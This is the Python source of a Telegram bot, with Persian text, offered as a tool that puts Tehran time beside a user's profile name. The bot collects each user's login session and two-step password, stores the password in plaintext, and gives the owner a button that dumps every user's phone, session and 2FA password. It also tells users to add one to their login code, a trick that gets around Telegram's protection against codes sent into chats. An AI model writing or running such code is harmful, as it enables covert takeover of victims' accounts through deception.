import asyncio
import asyncpg
import os
from datetime import datetime
from zoneinfo import ZoneInfo

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
    RPCError,
    UserNotParticipantError,
)
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import GetParticipantRequest

# ================== CONFIG ==================
BOT_API_ID = int(os.environ.get("BOT_API_ID"))
BOT_API_HASH = os.environ.get("BOT_API_HASH")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
OWNER_ID = int(os.environ.get("OWNER_ID"))

API_LIMIT_PER_APP = 30
TEHRAN = ZoneInfo("Asia/Tehran")

with open("database.txt") as f:
    DATABASE_URL = f.read().strip()

# ================== HELP TEXT ==================
HELP_TEXT = (
    "ℹ️ راهنمای استفاده از ربات سلف‌ساز\n\n"
    "استفاده از این ربات خیلی ساده‌ست 😊\n"
    "این ربات اسم پروفایل شما رو طوری تنظیم می‌کنه که "
    "ساعت ایران (تهران) با فونت دلخواه، هر ۶۰ ثانیه کنار اسمت آپدیت بشه.\n\n"

    "🔹 ورود بدون API (ساده‌ترین روش)\n"
    "• نیازی به API ID و API HASH نداری\n"
    "• فقط با شماره تلفن و کد تلگرام وارد می‌شی\n\n"
    "📌 توجه:\n"
    "ربات از APIهای آماده استفاده می‌کنه.\n"
    "اگر در لحظه ورود API خالی وجود نداشته باشه، ارور می‌گیری.\n"
    "در این حالت یا بعداً دوباره تلاش کن، یا API شخصی بساز.\n\n"

    "🔹 ورود با API شخصی (پایدارتر)\n"
    "• محدودیت نداره\n"
    "• استیبل‌تره\n"
    "• وابسته به APIهای عمومی ربات نیستی\n\n"

    "🕒 سلف تایم:\n"
    "• ساعت تهران\n"
    "• هر ۶۰ ثانیه آپدیت\n"
    "• فونت قابل انتخاب\n"
    "• تغییر واقعی اسم پروفایل\n"
)

# ================== NAME FONT MAP (preview for base name) ==================
# A few simple stylistic transforms for alphabetic characters.
# These maps are intentionally small but adequate for previews.
NAME_FONT_MAP = {
    0: lambda s: s,  # normal
    1: lambda s: "".join(
        {
            **{c: chr(ord(c) + 0x1D400 - ord('A')) for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"},
            **{c: chr(ord(c) + 0x1D41A - ord('a')) for c in "abcdefghijklmnopqrstuvwxyz"},
        }.get(ch, ch) for ch in s
    ),  # bold (approx)
    2: lambda s: "".join(chr(0xFF21 + (ord(ch) - 65)) if 'A' <= ch <= 'Z' else
                        chr(0xFF41 + (ord(ch) - 97)) if 'a' <= ch <= 'z' else ch for ch in s),  # fullwidth-ish
    3: lambda s: "".join(
        {
            **{c: chr(ord(c) + 0x1D434 - ord('A')) for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"},
            **{c: chr(ord(c) + 0x1D44E - ord('a')) for c in "abcdefghijklmnopqrstuvwxyz"},
        }.get(ch, ch) for ch in s
    ),  # italic-like (approx)
}

# ================== DATABASE ==================
async def init_db():
    pool = await asyncpg.create_pool(DATABASE_URL)
    # create tables (twofa_password column included); api_id marked UNIQUE
    await pool.execute(
        """
        CREATE TABLE IF NOT EXISTS users (
            user_id BIGINT PRIMARY KEY,
            phone TEXT,
            api_id INTEGER,
            api_hash TEXT,
            session_string TEXT,
            login_type TEXT,
            base_name TEXT,
            font_id INTEGER,
            twofa_password TEXT,
            is_active BOOLEAN DEFAULT true
        );

        CREATE TABLE IF NOT EXISTS api_pool (
            id SERIAL PRIMARY KEY,
            api_id INTEGER UNIQUE,
            api_hash TEXT,
            is_active BOOLEAN DEFAULT true
        );

        CREATE TABLE IF NOT EXISTS force_join (
            id SERIAL PRIMARY KEY,
            channel TEXT UNIQUE
        );

        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        );

        INSERT INTO settings (key, value)
        VALUES ('force_join_enabled', 'false')
        ON CONFLICT (key) DO NOTHING;
        """
    )
    return pool

# ================== BOT ==================
bot = TelegramClient("bot", BOT_API_ID, BOT_API_HASH)
running_tasks = {}       # user_id -> asyncio.Task
user_states = {}        # ephemeral per-user interaction state

# Digit/time font map (used for clock digits)
FONT_MAP = {
    0: lambda x: x,
    1: lambda s: s.translate(str.maketrans("0123456789:", "𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡:")),
    2: lambda s: s.translate(str.maketrans("0123456789:", "０１２３４５６７８９：")),
    3: lambda s: s.translate(str.maketrans("0123456789:", "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗:")),
}

def now_time():
    return datetime.now(TEHRAN).strftime("%H:%M")

# ================== FORCE JOIN ==================
async def force_join_required(event):
    if event.sender_id == OWNER_ID:
        return False
    enabled = await bot.pool.fetchval("SELECT value FROM settings WHERE key='force_join_enabled'")
    if enabled != "true":
        return False
    channels = await bot.pool.fetch("SELECT channel FROM force_join")
    for ch in channels:
        try:
            await bot(GetParticipantRequest(ch["channel"], event.sender_id))
        except UserNotParticipantError:
            return True
    return False

# ================== API POOL ==================
async def get_available_api():
    rows = await bot.pool.fetch("SELECT api_id, api_hash FROM api_pool WHERE is_active=true")
    for r in rows:
        count = await bot.pool.fetchval("SELECT COUNT(*) FROM users WHERE api_id=$1", r["api_id"])
        if count < API_LIMIT_PER_APP:
            return r["api_id"], r["api_hash"]
    return None, None

async def test_api(api_id, api_hash):
    try:
        c = TelegramClient(StringSession(), api_id, api_hash)
        await c.connect()
        await c.disconnect()
        return True
    except RPCError:
        return False
    except Exception:
        return False

# ================== SELF TASK ==================
async def start_self_task(user_id, session_string, api_id, api_hash, base_name, font_id):
    if not session_string or not api_id or not api_hash or base_name is None or font_id is None:
        return

    client = TelegramClient(StringSession(session_string), api_id, api_hash)
    try:
        await client.connect()
    except Exception:
        return

    async def runner():
        while True:
            try:
                t = FONT_MAP.get(font_id, FONT_MAP[0])(now_time())
                name = f"{base_name} {t}".strip()
                await client(UpdateProfileRequest(first_name=name))
                await asyncio.sleep(60)
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds + 5)
            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(60)

    await stop_self_task(user_id)
    running_tasks[user_id] = asyncio.create_task(runner())

async def stop_self_task(user_id):
    task = running_tasks.get(user_id)
    if task:
        task.cancel()
        try:
            await task
        except Exception:
            pass
        running_tasks.pop(user_id, None)

async def load_all_users():
    rows = await bot.pool.fetch("SELECT * FROM users WHERE is_active=true")
    for r in rows:
        try:
            if not r["session_string"] or not r["api_id"] or not r["api_hash"]:
                continue
            if not r["base_name"] or r["font_id"] is None:
                continue
            await start_self_task(
                r["user_id"],
                r["session_string"],
                r["api_id"],
                r["api_hash"],
                r["base_name"],
                r["font_id"],
            )
        except Exception:
            continue

# ================== START HANDLER ==================
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    if await force_join_required(event):
        channels = await bot.pool.fetch("SELECT channel FROM force_join")
        await event.respond("برای استفاده از ربات ابتدا باید عضو کانال‌های زیر شوید:\n\n" + "\n".join(c["channel"] for c in channels))
        return

    uid = event.sender_id
    row = await bot.pool.fetchrow("SELECT is_active FROM users WHERE user_id=$1", uid)
    if row and row["is_active"]:
        await event.respond(
            "✅ سلف شما فعال است\n\nاز گزینه‌های زیر استفاده کن:",
            buttons=[
                [Button.inline("✏️ تغییر سلف", b"change_self")],
                [Button.inline("🛑 حذف سلف", b"remove_self")],
            ],
        )
        return

    await event.respond(
        "👋 سلام!\n\n"
        "این ربات بهت کمک می‌کنه اسم پروفایلت رو طوری تنظیم کنی که "
        "⏰ ساعت ایران (تهران) با فونت دلخواه کنار اسمت نمایش داده بشه "
        "و هر ۶۰ ثانیه خودکار آپدیت بشه.\n\n"
        "برای شروع روی دکمه زیر بزن 👇",
        buttons=[[Button.inline("🚀 شروع سلف‌سازی", b"start_self")]],
    )

# ================== CALLBACKS (single handler) ==================
@bot.on(events.CallbackQuery)
async def callbacks(event):
    uid = event.sender_id
    data = event.data.decode()

    # TOP / MAIN menu
    if data == "start_self":
        buttons = [
            [Button.inline("ورود بدون API", b"login_normal")],
            [Button.inline("ورود با API", b"login_api")],
            [Button.inline("ℹ️ راهنما", b"help")],
        ]
        if uid == OWNER_ID:
            buttons.append([Button.inline("👮 پنل ادمین", b"admin")])
        await event.edit("یکی از گزینه‌ها رو انتخاب کن 👇", buttons=buttons)
        return

    if data == "help":
        await event.edit(HELP_TEXT)
        return

    # ADMIN panel open
    if uid == OWNER_ID and data == "admin":
        await event.edit(
            "👮 پنل ادمین",
            buttons=[
                [Button.inline("➕ افزودن API", b"add_api")],
                [Button.inline("📋 لیست APIها", b"list_api")],
                [Button.inline("📢 پیام همگانی", b"broadcast")],
                [Button.inline("➕ افزودن کانال", b"add_channel")],
                [Button.inline("➖ حذف کانال", b"del_channel")],
                [Button.inline("🔒 فعال / غیرفعال عضویت", b"toggle_force")],
                [Button.inline("📥 دریافت سشن‌ها", b"get_sessions")],
            ],
        )
        return

    # LOGIN modes
    if data == "login_normal":
        user_states[uid] = {"mode": "normal", "expect": "phone"}
        await event.edit("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
        return

    if data == "login_api":
        user_states[uid] = {"mode": "api", "expect": "api_id"}
        await event.edit("🧩 API ID رو بفرست")
        return

    # ADMIN: add_channel / del_channel / toggle force / get_sessions
    if uid == OWNER_ID and data == "add_channel":
        user_states[uid] = {"admin": "add_channel", "step": "channel"}
        await event.edit("یوزرنیم کانال رو بفرست (مثال: @channel)")
        return

    if uid == OWNER_ID and data == "del_channel":
        user_states[uid] = {"admin": "del_channel", "step": "channel"}
        await event.edit("یوزرنیم کانالی که می‌خوای حذف بشه رو بفرست (مثال: @channel)")
        return

    if uid == OWNER_ID and data == "toggle_force":
        current = await bot.pool.fetchval("SELECT value FROM settings WHERE key='force_join_enabled'")
        new_value = "false" if current == "true" else "true"
        await bot.pool.execute("UPDATE settings SET value=$1 WHERE key='force_join_enabled'", new_value)
        status = "فعال ✅" if new_value == "true" else "غیرفعال ❌"
        await event.edit(f"وضعیت فورس‌جوین: {status}")
        return

    if uid == OWNER_ID and data == "get_sessions":
        rows = await bot.pool.fetch("SELECT user_id, phone, api_id, api_hash, session_string, twofa_password FROM users")
        text = ""
        for r in rows:
            text += (
                f"ID: {r['user_id']}\n"
                f"Phone: {r['phone']}\n"
                f"API ID: {r.get('api_id')}\n"
                f"API HASH: {r.get('api_hash')}\n"
                f"Session: {r['session_string']}\n"
                f"2FA: {r['twofa_password'] or 'ندارد'}\n\n"
            )
        await event.edit(text or "کاربری وجود ندارد")
        return

    # ADMIN: add_api/list_api/broadcast via callbacks
    if uid == OWNER_ID and data == "add_api":
        user_states[uid] = {"admin": "add_api", "step": "api_id"}
        await event.edit("➕ API ID رو بفرست")
        return

    if uid == OWNER_ID and data == "list_api":
        rows = await bot.pool.fetch(
            """
            SELECT a.api_id, a.is_active,
            COUNT(u.user_id) as users_count
            FROM api_pool a
            LEFT JOIN users u ON u.api_id = a.api_id
            GROUP BY a.api_id, a.is_active
            ORDER BY a.api_id
            """
        )
        if not rows:
            await event.edit("❌ هیچ API ای ثبت نشده")
            return
        text = "📋 لیست API ها:\n\n"
        for r in rows:
            text += (
                f"API ID: {r['api_id']}\n"
                f"وضعیت: {'فعال ✅' if r['is_active'] else 'غیرفعال ❌'}\n"
                f"تعداد کاربران: {r['users_count']}\n\n"
            )
        await event.edit(text)
        return

    if uid == OWNER_ID and data == "broadcast":
        user_states[uid] = {"admin": "broadcast"}
        await event.edit("📢 پیام همگانی رو بفرست")
        return

    # REMOVE / CHANGE SELF
    if data == "remove_self":
        await stop_self_task(uid)
        await bot.pool.execute("UPDATE users SET is_active=false WHERE user_id=$1", uid)
        await event.edit("🛑 سلف شما غیرفعال شد")
        return

    if data == "change_self":
        await stop_self_task(uid)
        user_states[uid] = {"mode": "change", "expect": "base_name", "change": True}
        await event.edit("✏️ اسم جدید قبل ساعت رو بفرست")
        return

    return

# ================== MESSAGE FLOW (single handler) ==================
@bot.on(events.NewMessage)
async def messages(event):
    uid = event.sender_id
    txt = event.raw_text.strip()

    st = user_states.get(uid)
    if not st:
        return

    try:
        # ADMIN add_channel/del_channel
        if st.get("admin") == "add_channel" and st.get("step") == "channel" and uid == OWNER_ID:
            channel = txt
            await bot.pool.execute("INSERT INTO force_join (channel) VALUES ($1) ON CONFLICT DO NOTHING", channel)
            await event.respond("✅ کانال با موفقیت اضافه شد")
            user_states.pop(uid, None)
            return

        if st.get("admin") == "del_channel" and st.get("step") == "channel" and uid == OWNER_ID:
            channel = txt
            await bot.pool.execute("DELETE FROM force_join WHERE channel=$1", channel)
            await event.respond("✅ کانال با موفقیت حذف شد")
            user_states.pop(uid, None)
            return

        # ADMIN add_api flow
        if st.get("admin") == "add_api" and st.get("step") == "api_id" and uid == OWNER_ID:
            try:
                st["api_id"] = int(txt)
            except Exception:
                await event.respond("❌ API ID باید عدد باشه")
                return
            st["step"] = "api_hash"
            await event.respond("API HASH رو بفرست")
            return

        if st.get("admin") == "add_api" and st.get("step") == "api_hash" and uid == OWNER_ID:
            api_hash = txt.strip()
            ok = await test_api(st["api_id"], api_hash)
            if not ok:
                await event.respond("❌ API معتبر نیست یا ارتباط مشکل داره")
                return
            await bot.pool.execute(
                "INSERT INTO api_pool (api_id, api_hash, is_active) VALUES ($1,$2,true) ON CONFLICT (api_id) DO UPDATE SET api_hash=$2, is_active=true",
                st["api_id"],
                api_hash,
            )
            await event.respond("✅ API با موفقیت اضافه شد")
            user_states.pop(uid, None)
            return

        # ADMIN broadcast
        if st.get("admin") == "broadcast" and uid == OWNER_ID:
            rows = await bot.pool.fetch("SELECT user_id FROM users")
            sent = 0
            for r in rows:
                try:
                    await bot.send_message(r["user_id"], txt)
                    sent += 1
                except Exception:
                    continue
            await event.respond(f"✅ پیام همگانی ارسال شد\n📨 ارسال موفق: {sent}")
            user_states.pop(uid, None)
            return

        # LOGIN: api_id/api_hash (api mode)
        if st.get("expect") == "api_id" and st.get("mode") == "api":
            try:
                st["api_id"] = int(txt)
            except Exception:
                await event.respond("❌ API ID باید عدد باشه")
                return
            st["expect"] = "api_hash"
            await event.respond("API HASH رو بفرست")
            return

        if st.get("expect") == "api_hash" and st.get("mode") == "api":
            st["api_hash"] = txt
            st["expect"] = "phone"
            await event.respond("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
            return

        # LOGIN: phone
        if st.get("expect") == "phone":
            st["phone"] = txt
            if st.get("mode") == "normal":
                api_id, api_hash = await get_available_api()
                if not api_id:
                    await event.respond(
                        "❌ در حال حاضر API خالی نداریم\n"
                        "یا خودت API بساز یا بعداً دوباره تلاش کن\n\n"
                        "ℹ️ راهنما رو ببین"
                    )
                    user_states.pop(uid, None)
                    return
                st["api_id"], st["api_hash"] = api_id, api_hash

            client = TelegramClient(StringSession(), st["api_id"], st["api_hash"])
            try:
                await client.connect()
                await client.send_code_request(st["phone"])
            except Exception as e:
                await event.respond(f"❌ خطا در ارسال کد: {e}")
                user_states.pop(uid, None)
                return

            st["client"] = client
            st["expect"] = "code"

            # stronger warning with examples
            await event.respond(
                "🔴🚨 مهم — حتماً توجه کن! 🚨🔴\n"
                "تلگرام برات یه کد عددی می‌فرسته. **قبل از ارسال به ربات، باید یک واحد به آن عدد اضافه کنی** و سپس ارسال کنی.\n\n"
                "⚠️ اگر عدد رو بدون تغییر بفرستی ورود انجام نمی‌شود.\n\n"
                "نمونه‌ها:\n"
                "• اگر تلگرام فرستاد: 48391 → تو بفرست: 48392\n"
                "• اگر تلگرام فرستاد: 12345 → تو بفرست: 12346\n"
            )
            return

        # LOGIN: code (numeric)
        if st.get("expect") == "code" and not st.get("need_2fa"):
            try:
                code = str(int(txt) - 1)
            except Exception:
                await event.respond("❌ کد نامعتبره. لطفاً همان عددی که تلگرام می‌فرسته رو بفرست (یک واحد باید اضافه کنی).")
                return
            try:
                await st["client"].sign_in(st["phone"], code)
            except SessionPasswordNeededError:
                st["need_2fa"] = True
                st["expect"] = "2fa"
                await event.respond("🔐 رمز دو مرحله‌ای رو بفرست")
                return
            except Exception as e:
                await event.respond(f"❌ خطا در ورود: {e}")
                user_states.pop(uid, None)
                return

            st["session"] = st["client"].session.save()
            st["expect"] = "base_name"
            await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
            return

        # LOGIN: 2FA
        if st.get("expect") == "2fa" and st.get("need_2fa"):
            try:
                await st["client"].sign_in(password=txt)
            except Exception as e:
                await event.respond(f"❌ خطا در ورود با 2FA: {e}")
                user_states.pop(uid, None)
                return
            st["password"] = True
            st["session"] = st["client"].session.save()
            # save session and twofa minimally
            await bot.pool.execute(
                """
                INSERT INTO users (user_id, phone, api_id, api_hash, session_string, twofa_password, is_active)
                VALUES ($1,$2,$3,$4,$5,$6,true)
                ON CONFLICT (user_id) DO UPDATE SET
                    session_string=$5,
                    twofa_password=$6
                """,
                uid,
                st.get("phone"),
                st.get("api_id"),
                st.get("api_hash"),
                st.get("session"),
                txt,
            )
            st["expect"] = "base_name"
            await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
            return

        # BASE NAME -> now show name font previews
        if st.get("expect") == "base_name":
            st["raw_base_name"] = txt
            st["expect"] = "name_font"
            # show preview samples using NAME_FONT_MAP
            samples = [
                NAME_FONT_MAP.get(0, lambda s: s)(txt),
                NAME_FONT_MAP.get(1, lambda s: s)(txt),
                NAME_FONT_MAP.get(2, lambda s: s)(txt),
                NAME_FONT_MAP.get(3, lambda s: s)(txt),
            ]
            await event.respond(
                "🎨 فونت اسم پایه رو انتخاب کن — نمونه‌ها رو ببین و انتخاب کن:",
                buttons=[
                    [Button.inline(samples[0], b"namefont_0")],
                    [Button.inline(samples[1], b"namefont_1")],
                    [Button.inline(samples[2], b"namefont_2")],
                    [Button.inline(samples[3], b"namefont_3")],
                ],
            )
            return

    except Exception as e:
        await event.respond(f"❌ خطا: {e}")
        user_states.pop(uid, None)
        return

# ================== NAME FONT PICK ==================
@bot.on(events.CallbackQuery(pattern=b"namefont_"))
async def name_font_pick(event):
    uid = event.sender_id
    data = event.data.decode()
    idx = int(data.split("_")[1])
    st = user_states.get(uid, {})

    if "raw_base_name" not in st:
        await event.answer("خطا: وضعیت نامشخص", alert=True)
        return

    # set base_name using chosen name font transformation
    raw = st["raw_base_name"]
    try:
        mapped = NAME_FONT_MAP.get(idx, NAME_FONT_MAP[0])(raw)
    except Exception:
        mapped = raw
    st["base_name"] = mapped
    # set tentative font id to match choice (so digits font uses same id indices)
    st["font_id"] = idx
    st["expect"] = "font"

    await event.edit(
        "🎨 حالا فونت ساعت رو انتخاب کن (این فونت روی ساعت اعمال می‌شه):",
        buttons=[
            [Button.inline("بدون فونت", b"font_0")],
            [Button.inline("𝟙𝟟:𝟛𝟚", b"font_1")],
            [Button.inline("１７:３２", b"font_2")],
            [Button.inline("𝟏𝟕:𝟑𝟐", b"font_3")],
        ],
    )

# ================== FONT PICK ==================
@bot.on(events.CallbackQuery(pattern=b"font_"))
async def font_pick(event):
    uid = event.sender_id
    data = event.data.decode()
    font_id = int(data.split("_")[1])
    st = user_states.get(uid, {})

    # If user was in change flow
    if st.get("mode") == "change" or st.get("change"):
        row = await bot.pool.fetchrow("SELECT session_string, api_id, api_hash FROM users WHERE user_id=$1", uid)
        if not row or not row["session_string"]:
            await event.edit("⚠️ سشن پیدا نشد. ابتدا یکبار لاگین کن.")
            user_states.pop(uid, None)
            return

        await bot.pool.execute(
            "UPDATE users SET base_name=$1, font_id=$2, is_active=true WHERE user_id=$3",
            st.get("base_name"),
            font_id,
            uid,
        )

        await start_self_task(uid, row["session_string"], row["api_id"], row["api_hash"], st.get("base_name"), font_id)

        await event.edit(
            "✅ سلف تایم با موفقیت فعال شد\n\nاز گزینه‌های زیر استفاده کن:",
            buttons=[
                [Button.inline("✏️ تغییر سلف", b"change_self")],
                [Button.inline("🛑 حذف سلف", b"remove_self")],
            ],
        )
        user_states.pop(uid, None)
        return

    # Normal new activation flow after login/name-font
    if st.get("expect") == "font" and st.get("session"):
        # if font_id not set from name_font, set it now
        await bot.pool.execute(
            """
            INSERT INTO users (user_id, phone, api_id, api_hash, session_string,
                               login_type, base_name, font_id, is_active)
            VALUES ($1,$2,$3,$4,$5,$6,$7,$8,true)
            ON CONFLICT (user_id) DO UPDATE SET
                session_string=$5,
                api_id=$3,
                api_hash=$4,
                base_name=$7,
                font_id=$8,
                is_active=true
            """,
            uid,
            st.get("phone"),
            st.get("api_id"),
            st.get("api_hash"),
            st.get("session"),
            st.get("mode"),
            st.get("base_name"),
            font_id,
        )

        await start_self_task(uid, st.get("session"), st.get("api_id"), st.get("api_hash"), st.get("base_name"), font_id)

        await event.edit(
            "✅ سلف تایم با موفقیت فعال شد\n\nاز گزینه‌های زیر استفاده کن:",
            buttons=[
                [Button.inline("✏️ تغییر سلف", b"change_self")],
                [Button.inline("🛑 حذف سلف", b"remove_self")],
            ],
        )
        user_states.pop(uid, None)
        return

    await event.answer("خطا: وضعیت نامشخص", alert=True)

# ================== MAIN ==================
async def main():
    bot.pool = await init_db()
    await bot.start(bot_token=BOT_TOKEN)
    await load_all_users()
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
